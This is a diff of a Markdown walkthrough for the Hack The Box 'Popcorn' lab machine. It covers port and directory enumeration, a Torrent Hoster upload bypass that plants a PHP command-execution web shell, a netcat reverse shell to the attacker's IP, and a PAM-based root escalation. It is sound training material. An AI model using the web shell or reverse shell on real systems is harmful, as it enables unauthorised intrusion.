@@ -1,27 +1,26 @@
 # \_\__LeeCyberSec_\_\_
 | About Author | **Hack The Box Walkthrough** |
 | :-------------------------------- |-------------------------------|
-| **I'm Hades - Red/purple teamer** <br> `Email:` [tuvn@protonmail.com](mailto:tuvn@protonmail.com) <br> <br> `Platform:` [HackTheBox](https://www.hackthebox.eu/profile/167764) \|\| [TryHackMe](https://tryhackme.com/p/leecybersec) \|\| [PentesterLab](https://pentesterlab.com/profile/leecybersec) <br> <br> <img src="http://www.hackthebox.eu/badge/image/167764" alt="Hack The Box"> <br> <br> *Support me at [buymeacoffee](https://www.buymeacoffee.com/leecybersec)* <br> <a href='https://www.buymeacoffee.com/leecybersec' target="blank"><img src="images/bymeacoffee.png" width="200"/></a> | ![](images/1.png) |
+| **I'm Hades - Red/purple teamer** <br> `Email:` [tuvn@protonmail.com](mailto:tuvn@protonmail.com) <br> <br> `Platform:` [HackTheBox](https://www.hackthebox.eu/profile/167764) \|\| [TryHackMe](https://tryhackme.com/p/leecybersec) \|\| [PentesterLab](https://pentesterlab.com/profile/leecybersec) <br> <br> <img src="http://www.hackthebox.eu/badge/image/167764" alt="Hack The Box"> <br> <br> *Support me at [buymeacoffee](https://www.buymeacoffee.com/leecybersec)* <br> <a href='https://www.buymeacoffee.com/leecybersec' target="blank"><img src="images/bymeacoffee.png" width="200"/></a> | <img src="images/1.png" width="555"/></a> |
 
 ## Information Gathering
 
 ### Openning Services
 
-```
-┌──(Hades㉿10.10.14.5)-[0.8:25.5]~/scripting
-└─$ sudo ./enum/all.sh 10.10.10.6
-[sudo] password for kali: 
++ Apache httpd 2.2.12
 
+```
 ### Port Scanning ############################
-nmap -sS -p- --min-rate 1000 10.10.10.6 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//
+nmap -sS -Pn -p- --min-rate 1000 10.10.10.6
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 
 [+] Openning ports: 22,80
 
 ### Services Enumeration ############################
 nmap -sC -sV -Pn 10.10.10.6 -p22,80
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 05:15 EDT
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 09:14 +07
 Nmap scan report for 10.10.10.6
-Host is up (0.25s latency).
+Host is up (0.26s latency).
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
@@ -34,43 +33,47 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
-```
-
-### Apache httpd 2.2.12
-
-List of the hidden with gobuster, I saw a special uri `torrent` which is Torrent Hoster.
-
-```
-### Web Enumeration (80) ############################
-
-[+] Files and directories
-gobuster dir -k -u http://10.10.10.6:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt
-<snip>
-===============================================================
-/.hta                 (Status: 403) [Size: 282]
-/.htaccess            (Status: 403) [Size: 287]
-/.htpasswd            (Status: 403) [Size: 287]
-/cgi-bin/             (Status: 403) [Size: 286]
-/index                (Status: 200) [Size: 177]
-/index.html           (Status: 200) [Size: 177]
-/test                 (Status: 200) [Size: 47041]
-/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
-                                                                                
-<snip>
+Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds
 ```
 
 ### Torrent Hoster
 
+List of the hidden with gobuster, there is a special uri `torrent` which is Torrent Hoster.
+
+```
+[+] Files and directories
+gobuster dir -q -e -k -u http://10.10.10.6:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+http://10.10.10.6:80/index                (Status: 200) [Size: 177]
+http://10.10.10.6:80/test                 (Status: 200) [Size: 47041]
+http://10.10.10.6:80/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
+http://10.10.10.6:80/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/] 
+```
+
 Torrent Hoster hosted at `http://10.10.10.6/torrent/`.
 
-At `http://10.10.10.6/torrent/users/index.php?mode=register`, I sign up an account `user:user` and login.
+At `register` page, let's sign up an account `user:user`.
 
 ![](images/2.png)
 
-Using `searsploit` to find some exploits for Torrent hoster
+Download a torrent and upload to the server like a normal using, example `kali-linux-2021.1-installer-amd64.iso.torrent` and upload it to Torrent Hoster.
 
 ```
+wget https://images.kali.org/kali-linux-2021.1-installer-amd64.iso.torrent
+```
+
+![](images/3.png)
+
+After upload file successfully, go to `Edit this torrent` and update the torrent. We can update the torrent by adding a screenshot at `Update Screenshot`.
+
+![](images/4.png)
+
+Update screenshot successfully
+
+![](images/5.png)
+
+Let's find public exploit for Torrent hoster
+
+``` bash
 ┌──(Hades㉿10.10.14.5)-[5.0:20.9]~
 └─$ searchsploit torrent hoster
 ------------------------------------ ---------------------------------
@@ -79,46 +82,19 @@ Using `searsploit` to find some exploits for Torrent hoster
 Torrent Hoster - Remount Upload     | php/webapps/11746.txt
 ------------------------------------ ---------------------------------
 Shellcodes: No Results
-``` 
-Try to using the web application, I download a torrent file, example `kali-linux-2021.1-installer-amd64.iso.torrent` and upload it to Torrent Hoster at `http://10.10.10.6/torrent/torrents.php?mode=upload`
-
 ```
-wget https://images.kali.org/kali-linux-2021.1-installer-amd64.iso.torrent
-```
-
-![](images/3.png)
-
-At `http://10.10.10.6/torrent/torrents.php?mode=details&id=8509e36e3f62457bb3e33d07cd9a2440b83aa9fd` check `Edit this torrent` and view another page to update the torrent. In there, I can upload an image to `Update Screenshot`.
-
-At `10.10.10.6/torrent/edit.php?mode=edit&id=8509e36e3f62457bb3e33d07cd9a2440b83aa9fd`, I download an image and update the screenshot
-
-![](images/4.png)
-
-File successfully uploaded
-
-![](images/5.png)
 
 ## Foothold
 
 ### File Upload Bypass
 
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/popcorn)
+Based on [File Upload Bypass Techniques](https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques/) and exploit `php/webapps/11746.txt`. We can upload an backdoor at `Update Screenshot`
 
-[File Upload Bypass Techniques](https://infinitelogins.com/2020/08/07/file-upload-bypass-techniques/)
-
-Using exploit `php/webapps/11746.txt` and gain the foothold in the server.
-
-At the infor gathering, there are 2 way to upload file which are upload torrent file and upload screenshot file.
-
-At `upload screenshot file`, I try to upload a normal image and intercept the request with Burp Suite.
-
-Change the content in the image to `<?php system($_GET['cmd']); ?>` and change the file name extension to `bymeacoffee.jpg.php`
+Upload a normal image and intercept the request with Burp Suite. Change the content in the image to `<?php system($_GET['cmd']); ?>` and change the file name extension to `bymeacoffee.jpg.php`
 
 ![](images/6.png)
 
 Back to torrent file in the server and get the location of the backdoor.
-
-It is `http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/8509e36e3f62457bb3e33d07cd9a2440b83aa9fd.php&maxw=96`.
 
 ![](images/7.png)
 
@@ -127,8 +103,6 @@ Follow the url, I can access to the upload folder at `http://10.10.10.6/torrent/
 ![](images/8.png)
 
 ### Gain Reverse Shell
-
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/popcorn)
 
 Execute the backdoor and get reverse shell.
 
@@ -146,12 +120,6 @@ Url encode payload with `hURL`
 
 Original    :: nc -nv 10.10.14.5 443 -e /bin/sh
 URL ENcoded :: nc%20-nv%2010.10.14.5%20443%20-e%20%2Fbin%2Fsh
-```
-
-Open listener in the kali machine.
-
-```
-sudo nc -nvlp 443
 ```
 
 Execute payload
@@ -214,11 +182,7 @@ mysql> select * from users;
 
 ### Linux PAM 1.1.0
 
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/popcorn)
-
-[HTB: Popcorn](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)
-
-At george's home folder, I saw an interested folder named `.cache` containing file `motd.legal-displayed`.
+At george's home folder, there is an interested folder named `.cache` containing file `motd.legal-displayed`.
 
 ```
 www-data@popcorn:/home/george$ ls -laR
@@ -318,3 +282,7 @@ whoami
 root
 # 
 ```
+
+## Reference 
+
+[https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)
